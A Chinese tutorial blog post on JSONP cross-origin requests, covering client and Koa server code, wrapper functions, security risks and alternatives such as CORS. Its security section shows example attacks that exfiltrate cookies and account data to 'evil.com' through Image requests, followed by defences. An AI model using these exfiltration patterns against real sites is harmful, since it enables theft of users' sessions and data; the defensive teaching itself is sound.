JSONP跨域解决方案详解：原理、实现与安全实践

发表于2023|更新于2026|前端基础
|字数总计:3.4k|阅读时长:15分钟

前言：为什么需要 JSONP

在前端开发中，跨域是一个常见的问题。由于浏览器的同源策略（Same-Origin Policy），不同源之间的 AJAX 请求会受到限制。在 CORS（跨域资源共享）标准普及之前，JSONP 是最流行的跨域解决方案之一。

虽然现代开发中 CORS 已经成为主流，但 JSONP 仍然出现在很多面试题中，理解其原理对于前端工程师来说非常重要。本文将深入讲解 JSONP 的原理、实现方式以及安全性问题。

一、JSONP 是什么

JSONP（JSON with Padding）是一种绕过同源策略实现跨域请求的技术。其核心思想是：

  • 利用 <script> 标签不受同源策略限制的特性
  • 动态创建 script 标签请求跨域数据
  • 服务器返回的不再是纯 JSON 数据，而是将 JSON 数据作为参数传递给回调函数
  • 前端预先定义好回调函数来接收数据

关键点：JSONP 只支持 GET 请求，因为 script 标签只能发送 GET 请求

二、JSONP 原理详解

2.1 同源策略与 script 标签

浏览器的同源策略限制了：

  • AJAX 请求（XMLHttpRequest、Fetch）
  • DOM 操作
  • Cookie、LocalStorage、IndexedDB

但以下标签不受同源策略限制：

  • <script src="...">
  • <img src="...">
  • <link href="...">
  • <iframe src="...">

JSONP 正是利用了 <script> 标签可以跨域加载脚本的特性。

2.2 工作流程

客户端                                服务器
  │                                    │
  ├─ 1. 定义回调函数 callback()         │
  ├─ 2. 创建 <script> 标签              │
  ├─ 3. 设置 src="url?callback=fn" ───→ │
  │                                    ├─ 4. 接收请求，获取 callback 参数
  │                                    ├─ 5. 返回 "callback(data)"
  │ ←───────────────────────────────────┤
  ├─ 6. script 标签加载完成             │
  ├─ 7. 自动执行 callback(data)         │
  └─ 8. 获得数据                        │

2.3 简单示例

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>JSONP 基础示例</title>
</head>
<body>
  <h1>JSONP 基础示例</h1>
  <div id="result"></div>

  <script>
    // 1. 定义回调函数
    function handleData(data) {
      console.log('收到数据:', data);
      const resultDiv = document.getElementById("result");
      resultDiv.innerHTML = `Name: ${data.name}, Age: ${data.age}`;
    }

    // 2. 创建 script 标签
    const script = document.createElement("script");
    
    // 3. 设置请求 URL，传递回调函数名
    // 服务器会根据 callback 参数返回 handleData(data)
    script.src = "http://localhost:3000/api/data?callback=handleData";
    
    // 4. 插入到 DOM 中触发请求
    document.body.appendChild(script);
    
    // 5. 请求完成后删除 script 标签（可选）
    script.onload = function() {
      document.body.removeChild(script);
    };
  </script>
</body>
</html>

服务器端实现（Node.js）

const Koa = require("koa");
const Router = require("koa-router");

const app = new Koa();
const router = new Router();

// 模拟数据
const jsonData = {
  name: "John",
  age: 30,
  city: "New York"
};

// JSONP 接口
router.get("/api/data", (ctx) => {
  const callback = ctx.query.callback;
  
  if (callback) {
    // 设置响应类型为 JavaScript
    ctx.type = 'application/javascript';
    // 返回：handleData({"name":"John","age":30,"city":"New York"})
    ctx.body = `${callback}(${JSON.stringify(jsonData)})`;
  } else {
    // 没有 callback 参数，返回普通 JSON
    ctx.body = jsonData;
  }
});

app.use(router.routes()).use(router.allowedMethods());

const port = 3000;
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});

关键点解析：

  1. 前端定义回调函数：handleData 用于接收服务器返回的数据
  2. 传递回调函数名：通过 URL 参数 callback=handleData 告诉服务器
  3. 服务器返回函数调用：handleData({"name":"John",...})
  4. 自动执行：script 标签加载后自动执行返回的代码

三、手写 JSONP 封装函数

上面的例子是最基础的实现。实际开发中，我们需要封装一个更完善的 JSONP 函数：

3.1 基础版本

function jsonp(url, callback = 'callback') {
  return new Promise((resolve, reject) => {
    // 1. 创建全局回调函数
    const callbackName = `jsonp_callback_${Date.now()}_${Math.random().toString(36).substr(2)}`;
    
    window[callbackName] = function(data) {
      resolve(data);
      // 清理全局函数
      delete window[callbackName];
    };
    
    // 2. 创建 script 标签
    const script = document.createElement('script');
    
    // 3. 处理 URL
    const separator = url.includes('?') ? '&' : '?';
    script.src = `${url}${separator}${callback}=${callbackName}`;
    
    // 4. 错误处理
    script.onerror = function() {
      reject(new Error('JSONP 请求失败'));
      delete window[callbackName];
      document.body.removeChild(script);
    };
    
    // 5. 插入 DOM
    document.body.appendChild(script);
    
    // 6. 加载完成后移除 script 标签
    script.onload = function() {
      document.body.removeChild(script);
    };
  });
}

// 使用示例
jsonp('http://localhost:3000/api/data')
  .then(data => console.log(data))
  .catch(err => console.error(err));

3.2 完整版本（支持配置和超时）

function jsonp(options) {
  const {
    url,
    data = {},           // 请求参数
    callback = 'callback', // 回调参数名
    timeout = 10000      // 超时时间
  } = options;
  
  return new Promise((resolve, reject) => {
    // 1. 生成唯一的回调函数名
    const callbackName = `jsonp_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;
    
    // 2. 创建全局回调函数
    window[callbackName] = function(responseData) {
      resolve(responseData);
      cleanup();
    };
    
    // 3. 构建请求 URL
    const query = Object.keys(data)
      .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(data[key])}`)
      .join('&');
    
    const separator = url.includes('?') ? '&' : '?';
    const requestUrl = `${url}${separator}${callback}=${callbackName}&${query}`;
    
    // 4. 创建 script 标签
    const script = document.createElement('script');
    script.src = requestUrl;
    
    // 5. 超时处理
    const timer = setTimeout(() => {
      reject(new Error(`JSONP 请求超时（${timeout}ms）`));
      cleanup();
    }, timeout);
    
    // 6. 错误处理
    script.onerror = function() {
      reject(new Error('JSONP 请求失败'));
      cleanup();
    };
    
    // 7. 清理函数
    function cleanup() {
      clearTimeout(timer);
      delete window[callbackName];
      if (script.parentNode) {
        document.body.removeChild(script);
      }
    }
    
    // 8. 发起请求
    document.body.appendChild(script);
  });
}

// 使用示例
jsonp({
  url: 'http://localhost:3000/api/user',
  data: {
    id: 123,
    name: 'John'
  },
  callback: 'callback',
  timeout: 5000
})
  .then(data => {
    console.log('请求成功:', data);
  })
  .catch(err => {
    console.error('请求失败:', err.message);
  });

3.3 支持取消的版本

function jsonpWithCancel(options) {
  const {
    url,
    data = {},
    callback = 'callback',
    timeout = 10000
  } = options;
  
  let cancelled = false;
  let cleanup = null;
  
  const promise = new Promise((resolve, reject) => {
    const callbackName = `jsonp_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;
    
    window[callbackName] = function(responseData) {
      if (!cancelled) {
        resolve(responseData);
      }
      cleanup && cleanup();
    };
    
    const query = Object.keys(data)
      .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(data[key])}`)
      .join('&');
    
    const separator = url.includes('?') ? '&' : '?';
    const requestUrl = `${url}${separator}${callback}=${callbackName}&${query}`;
    
    const script = document.createElement('script');
    script.src = requestUrl;
    
    const timer = setTimeout(() => {
      if (!cancelled) {
        reject(new Error(`JSONP 请求超时`));
      }
      cleanup && cleanup();
    }, timeout);
    
    script.onerror = function() {
      if (!cancelled) {
        reject(new Error('JSONP 请求失败'));
      }
      cleanup && cleanup();
    };
    
    cleanup = function() {
      clearTimeout(timer);
      delete window[callbackName];
      if (script.parentNode) {
        document.body.removeChild(script);
      }
    };
    
    document.body.appendChild(script);
  });
  
  // 返回 promise 和取消函数
  return {
    promise,
    cancel: function() {
      cancelled = true;
      cleanup && cleanup();
    }
  };
}

// 使用示例
const { promise, cancel } = jsonpWithCancel({
  url: 'http://localhost:3000/api/data',
  timeout: 10000
});

promise
  .then(data => console.log(data))
  .catch(err => console.error(err));

// 5秒后取消请求
setTimeout(() => {
  cancel();
  console.log('请求已取消');
}, 5000);

四、JSONP 优缺点分析

4.1 优点

优点 说明
✅ 兼容性好 支持所有浏览器，包括 IE6+
✅ 实现简单 无需服务器特殊配置（CORS 需要设置响应头）
✅ 跨域支持 完美绕过同源策略
✅ 轻量级 不依赖额外的库

4.2 缺点

缺点 说明 风险等级
❌ 仅支持 GET 无法发送 POST、PUT 等请求 中
❌ XSS 风险 服务器返回的代码会被直接执行 🔴 高
❌ CSRF 攻击 容易被恶意网站利用 🔴 高
❌ 错误处理困难 无法获取 HTTP 状态码 中
❌ 无法设置请求头 不能自定义 Content-Type 等 低
❌ 超时控制复杂 需要手动实现超时机制 低

五、安全性问题详解

5.1 XSS 攻击风险

问题：JSONP 返回的是可执行的 JavaScript 代码，如果服务器被攻击或数据源不可信，可能注入恶意代码。

示例攻击场景：

// 恶意服务器返回：
callbackFunction(
  // 正常数据
  {name: 'John', age: 30}
);
// 恶意代码
document.cookie = 'session=stolen'; // 窃取 Cookie
new Image().src = 'http://evil.com?cookie=' + document.cookie;

防御措施：

  1. 数据验证：服务器端过滤危险字符
// 服务器端示例
router.get('/api/data', (ctx) => {
  const callback = ctx.query.callback;
  
  // 验证回调函数名是否合法（只允许字母、数字、下划线）
  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(callback)) {
    ctx.status = 400;
    ctx.body = 'Invalid callback name';
    return;
  }
  
  ctx.type = 'application/javascript';
  ctx.body = `${callback}(${JSON.stringify(jsonData)})`;
});
  1. Referer 检查：验证请求来源
// 服务器端检查
router.get('/api/data', (ctx) => {
  const referer = ctx.headers.referer || '';
  
  // 只允许特定域名访问
  const allowedDomains = ['http://localhost:3000', 'https://mysite.com'];
  const isAllowed = allowedDomains.some(domain => referer.startsWith(domain));
  
  if (!isAllowed) {
    ctx.status = 403;
    ctx.body = 'Forbidden';
    return;
  }
  
  // 处理 JSONP 请求
  // ...
});

5.2 CSRF 攻击风险

问题：恶意网站可以调用你的 JSONP 接口获取用户敏感数据。

攻击示例：

<!-- 恶意网站 evil.com -->
<script>
  function stealData(data) {
    // 将用户数据发送到攻击者服务器
    new Image().src = 'http://evil.com/steal?data=' + JSON.stringify(data);
  }
</script>
<script src="http://yourbank.com/api/account?callback=stealData"></script>

防御措施：

  1. Token 验证
// 前端
jsonp({
  url: 'http://api.example.com/data',
  data: {
    token: localStorage.getItem('csrf_token') // 从 Cookie 或 LocalStorage 获取
  }
});

// 后端
router.get('/api/data', (ctx) => {
  const token = ctx.query.token;
  const sessionToken = ctx.cookies.get('csrf_token');
  
  if (!token || token !== sessionToken) {
    ctx.status = 403;
    ctx.body = 'Invalid CSRF token';
    return;
  }
  
  // 处理请求
});
  1. 敏感数据保护
// 不要通过 JSONP 暴露敏感信息
// ❌ 错误做法
router.get('/api/user', (ctx) => {
  ctx.body = `${callback}(${JSON.stringify({
    name: 'John',
    password: '123456', // 泄露密码！
    creditCard: '4111111111111111' // 泄露银行卡！
  })})`;
});

// ✅ 正确做法
router.get('/api/user', (ctx) => {
  ctx.body = `${callback}(${JSON.stringify({
    name: 'John',
    email: 'john@example.com'
    // 只返回非敏感信息
  })})`;
});

六、JSONP vs 其他跨域方案

6.1 与 CORS 对比

对比项 JSONP CORS
支持的请求方法 仅 GET GET、POST、PUT、DELETE 等
浏览器支持 所有浏览器（包括 IE6+） IE10+、现代浏览器
错误处理 困难，无法获取状态码 完善，可获取完整响应
安全性 较低，存在 XSS 风险 较高，支持多种安全策略
请求头 无法自定义 可以自定义
实现复杂度 简单，无需特殊配置 需要服务器设置响应头
携带 Cookie 自动携带 需要设置 credentials
现代应用 逐渐淘汰 主流方案

6.2 与代理服务器对比

对比项 JSONP 代理服务器
服务器负担 无需额外服务器 需要代理服务器转发请求
性能 直接请求目标服务器 多一次转发，性能稍低
灵活性 受限于 GET 请求 支持所有 HTTP 方法
适用场景 简单数据获取 复杂业务场景

6.3 方案选择建议

选择决策树：

是否需要兼容 IE9 及以下？
  ├─ 是 → 使用 JSONP
  └─ 否 → 是否需要发送 POST/PUT 等请求？
            ├─ 是 → 使用 CORS 或代理
            └─ 否 → 是否可以控制服务器配置？
                      ├─ 是 → 使用 CORS
                      └─ 否 → 使用 JSONP 或代理

七、实际应用场景

7.1 适用场景

1. 第三方 API 调用

// 调用百度搜索建议 API
jsonp({
  url: 'https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su',
  data: {
    wd: 'JavaScript'
  },
  callback: 'cb'
}).then(data => {
  console.log('搜索建议:', data.s);
});

2. 跨域数据统计

// 跨域访问统计
jsonp({
  url: 'https://analytics.example.com/track',
  data: {
    page: window.location.href,
    referrer: document.referrer,
    timestamp: Date.now()
  }
});

7.2 不适用场景

  • ❌ 需要发送敏感数据（登录、支付）
  • ❌ 需要 POST/PUT 等非 GET 请求
  • ❌ 需要精确的错误处理
  • ❌ 需要自定义请求头
  • ❌ 对安全性要求较高的场景

八、JSONP 的替代方案

在现代 Web 开发中，推荐使用以下方案替代 JSONP：

8.1 CORS（推荐）

// 前端
fetch('http://api.example.com/data', {
  method: 'GET',
  credentials: 'include' // 携带 Cookie
})
  .then(response => response.json())
  .then(data => console.log(data));

// 后端（Express）
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://mysite.com');
  res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE');
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});

8.2 postMessage

// 父页面
const iframe = document.getElementById('iframe');
iframe.contentWindow.postMessage('getData', 'http://child.com');

window.addEventListener('message', (event) => {
  if (event.origin === 'http://child.com') {
    console.log('收到数据:', event.data);
  }
});

// 子页面（iframe）
window.addEventListener('message', (event) => {
  if (event.origin === 'http://parent.com') {
    event.source.postMessage({name: 'John'}, event.origin);
  }
});

8.3 WebSocket

// WebSocket 天然支持跨域
const ws = new WebSocket('ws://api.example.com/socket');

ws.onopen = function() {
  ws.send('Hello Server');
};

ws.onmessage = function(event) {
  console.log('收到消息:', event.data);
};

九、总结

9.1 核心要点

  1. 原理：利用 <script> 标签不受同源策略限制的特性
  2. 实现：动态创建 script，服务器返回函数调用
  3. 限制：仅支持 GET 请求
  4. 安全：存在 XSS 和 CSRF 风险，需要防御措施

9.2 最佳实践

  • ✅ 仅在兼容旧浏览器时使用 JSONP
  • ✅ 对回调函数名进行验证
  • ✅ 检查请求来源（Referer）
  • ✅ 不暴露敏感数据
  • ✅ 实现超时和错误处理
  • ✅ 优先使用 CORS 替代 JSONP

9.3 面试常见问题

Q1：JSONP 为什么只支持 GET 请求？
A：因为 JSONP 利用的是 <script> 标签的 src 属性，而 src 只能发送 GET 请求。

Q2：JSONP 和 CORS 的区别？
A：

  • JSONP：仅 GET、兼容性好、安全性低、无法获取状态码
  • CORS：支持所有方法、IE10+、安全性高、完整的错误处理

Q3：如何防止 JSONP 的 CSRF 攻击？
A：

  • Token 验证
  • Referer 检查
  • 不暴露敏感接口
  • 使用 POST + CORS 替代
